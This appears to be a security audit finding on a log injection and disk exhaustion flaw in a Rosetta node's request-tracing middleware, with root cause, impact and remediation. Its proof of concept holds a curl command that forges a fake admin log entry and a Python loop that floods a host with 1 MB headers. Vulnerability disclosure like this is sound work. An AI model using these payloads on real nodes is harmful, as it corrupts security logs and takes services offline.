### Title
Log Injection via Unsanitized X-Forwarded-For / X-Real-IP Header in `getClientIpAddress()`

### Summary
The `getClientIpAddress()` function in `rosetta/app/middleware/trace.go` reads the `X-Forwarded-For` or `X-Real-IP` header value directly from the HTTP request without any sanitization. The raw value is interpolated into a log message and emitted via logrus, allowing an unprivileged external attacker to inject arbitrary newline-delimited content into log files, forge fake log entries, and—by sending repeated requests with near-maximum-size headers—exhaust disk space.

### Finding Description

**Exact code path:**

`getClientIpAddress()` (lines 63–74) reads the header with no validation:

```go
// line 64
ipAddress := r.Header.Get(xRealIpHeader)
// line 67
ipAddress = r.Header.Get(xForwardedForHeader)
```

The raw value is then directly interpolated into the log message (lines 52–53):

```go
message := fmt.Sprintf("%s %s %s (%d) in %s",
    clientIpAddress, request.Method, path, ...)
```

And emitted to the log (lines 56–58):

```go
log.Info(message)
```

**Root cause:** No character filtering, length cap, or IP-address validation is applied to the header value before it is embedded in the log string. The failed assumption is that the `X-Forwarded-For` / `X-Real-IP` header will always contain a well-formed IP address.

**Why existing checks fail:** There are none. The test suite (trace_test.go line 76) even strips newlines from the captured log buffer before asserting content (`strings.ReplaceAll(... "\n", "")`), meaning newline-injection would silently pass all existing tests.

**Exploit flow:**
1. Attacker sends an HTTP request with a crafted header:
   `X-Forwarded-For: 1.2.3.4\ntime="2099-01-01" level=error msg="admin login succeeded" user=attacker`
2. `getClientIpAddress()` returns the raw multi-line string.
3. `fmt.Sprintf` embeds it verbatim into `message`.
4. `log.Info(message)` (logrus text formatter) writes the string as-is, splitting it across multiple log lines.
5. The second line appears as a fully formed, legitimate-looking logrus log entry.

**Disk exhaustion path:** Go's `net/http` default `MaxHeaderBytes` is 1 MB (1 << 20). An attacker can send requests with an `X-Forwarded-For` value of ~1 MB of padding. Each request produces a ~1 MB log entry. Sustained at even modest request rates this exhausts disk space without requiring a volumetric flood.

### Impact Explanation
- **Log integrity**: Attackers can forge arbitrary log entries (fake authentication events, fake IP addresses, fake status codes), undermining security monitoring and incident response.
- **Disk exhaustion (DoS)**: Each HTTP request can produce a log entry orders of magnitude larger than a normal entry. Filling the disk causes the Rosetta node process to fail or become unresponsive, taking the node offline. For a node representing ≥25% of network stake this is a protocol-level availability impact.
- **Severity**: High — no authentication required, remotely triggerable, repeatable.

### Likelihood Explanation
- **Preconditions**: None beyond network reachability. The Rosetta API is a public-facing HTTP endpoint by design.
- **No proxy dependency**: The vulnerability exists in application code. Whether a reverse proxy strips the header depends entirely on deployment configuration, which is not enforced by the code and is frequently misconfigured.
- **Repeatability**: Fully automatable; a simple loop of `curl` requests suffices.

### Recommendation
1. **Validate/sanitize the IP string** before logging. After obtaining `ipAddress`, apply a strict allowlist (e.g., parse with `net.ParseIP` / `net.ParseCIDR`; if invalid, substitute a placeholder like `"invalid-ip"`):
   ```go
   if net.ParseIP(ipAddress) == nil {
       ipAddress = "invalid"
   }
   ```
2. **Strip or escape control characters** (at minimum `\n`, `\r`, `\t`) from any header-derived value before embedding it in a log message.
3. **Use logrus structured fields** instead of `fmt.Sprintf` string interpolation — pass `clientIpAddress` as a field (`log.WithField("client_ip", clientIpAddress).Info(...)`) so the formatter can escape it safely.
4. **Cap header length** at the server level (`http.Server{MaxHeaderBytes: N}`) to bound the maximum log-entry size.

### Proof of Concept

```bash
# Log injection — forge a fake log entry
curl -H $'X-Forwarded-For: 1.2.3.4\ntime="2099-01-01T00:00:00Z" level=error msg="admin authenticated" user=attacker' \
     http://<rosetta-host>:<port>/network/list

# Disk exhaustion — send ~1 MB header per request in a loop
python3 -c "
import socket, time
payload = 'A' * 1_000_000
req = (
    'GET /network/list HTTP/1.1\r\n'
    'Host: target\r\n'
    f'X-Forwarded-For: {payload}\r\n'
    'Content-Length: 0\r\n\r\n'
)
while True:
    s = socket.create_connection(('<rosetta-host>', <port>))
    s.sendall(req.encode())
    s.close()
    time.sleep(0.01)
"
```
